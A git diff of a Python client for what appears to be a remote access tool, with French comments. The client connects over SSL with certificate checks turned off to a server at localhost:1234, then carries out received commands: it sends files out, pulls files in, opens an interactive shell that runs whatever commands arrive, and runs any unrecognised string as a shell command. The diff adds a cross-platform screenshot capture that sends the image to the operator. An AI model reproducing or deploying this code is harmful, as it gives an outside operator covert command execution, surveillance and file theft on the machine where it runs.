@@ -2,6 +2,7 @@ import socket
 import ssl
 import subprocess
 import os
+from PIL import ImageGrab
 
 
 # import pyautogui
@@ -38,7 +39,7 @@ def upload_feature(filename, conn):
             conn.send(progress.encode('utf-8'))
 
     print("File uploaded successfully")
-    conn.send(b"File uploaded successfully")
+    conn.send(b"\nFile uploaded successfully")
 
 
 def download_feature(file_path, conn):
@@ -54,7 +55,34 @@ def download_feature(file_path, conn):
             conn.send(chunk)
 
     print("File uploaded successfully")
-    conn.send(b"File uploaded successfully")
+    conn.send(b"\nFile uploaded successfully")
+
+
+def take_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save("screenshot.png")
+    screenshot.close()
+
+
+def screenshot_manager(conn):
+    print("Taking screenshot...")
+
+    if os.name == "nt":
+        # Windows
+        take_screenshot()
+        conn.send(b"ok")
+        download_feature("screenshot.png", conn)
+    else:
+        # Linux
+        display_configured = subprocess.getoutput("echo $DISPLAY")
+        if display_configured == "":
+            print("No display configured")
+            conn.send(b"NOK")
+            conn.send(b"[-] No display detected on client")
+        else:
+            take_screenshot()
+            conn.send(b"ok")
+            download_feature("screenshot.png", conn)
 
 
 def connect_to_server():
@@ -62,74 +90,71 @@ def connect_to_server():
     context.check_hostname = False  # Désactiver la vérification du nom d'hôte
     context.verify_mode = ssl.CERT_NONE  # Désactiver la vérification du certificat
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s = context.wrap_socket(s, server_hostname='localhost')  # Envelopper le socket avec SSL
-    s.connect(('localhost', 1234))
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn = context.wrap_socket(conn, server_hostname='localhost')  # Envelopper le socket avec SSL
+    conn.connect(('localhost', 1234))
 
     # get on which OS the client is running
-    s.send(os.name.encode('utf-8'))
+    conn.send(os.name.encode('utf-8'))
 
     while True:
-        command = s.recv(1024).decode('utf-8')
+        command = conn.recv(1024).decode('utf-8')
         if command.lower() == "close":
             break
 
         # UPLOAD FILE command
-        if command.lower().startswith("upload"):
+        elif command.lower().startswith("upload"):
             # format filename
             filename, file_path = format_filename(command.lower())
 
             # send the command
-            upload_feature(filename, s)
+            upload_feature(filename, conn)
 
         # DONWLOAD FILE command
-        if command.lower().startswith("download"):
+        elif command.lower().startswith("download"):
             # format filename
             filename, file_path = format_filename(command.lower())
 
             # send the command
-            download_feature(file_path, s)
+            download_feature(file_path, conn)
 
-        if command.lower() == "screenshot":
-            print("Taking screenshot...")
-            # screenshot = pyautogui.screenshot()
-            # screenshot.save("screenshot.png")
-            subprocess.run(["scrot", "screenshot.png"])
-            download_feature("screenshot.png", s)
+        elif command.lower() == "screenshot":
+            screenshot_manager(conn)
 
-        if command.lower() == "shell":
+        elif command.lower() == "shell":
             print("Shell opened")
 
             while True:
-                command = s.recv(1024).decode('utf-8')
+                command = conn.recv(1024).decode('utf-8')
                 print(command)
 
                 if command.startswith("cd"):
                     try:
                         new_path = command.split(" ")[1]
                         if not os.path.exists(new_path):
-                            s.send("Directory does not exist".encode('utf-8'))
+                            conn.send("Directory does not exist".encode('utf-8'))
                         else:
                             os.chdir(command.split(" ")[1])
-                            s.send("Directory changed".encode('utf-8'))
+                            conn.send("Directory changed".encode('utf-8'))
                     except IndexError:
-                        s.send("No directory specified".encode('utf-8'))
+                        conn.send("No directory specified".encode('utf-8'))
                         continue
                     continue
 
                 if command.lower() == "exit":
-                    s.send("End of Shell.".encode('utf-8'))
+                    conn.send("End of Shell.".encode('utf-8'))
                     break
 
                 output = subprocess.getoutput(command)
                 if not output:
                     output = "No output"
-                s.send(output.encode('utf-8'))
+                conn.send(output.encode('utf-8'))
+
         else:
             output = subprocess.getoutput(command.lower())
-            s.send(output.encode('utf-8'))
+            conn.send(output.encode('utf-8'))
 
-    s.close()
+    conn.close()
 
 
 if __name__ == "__main__":
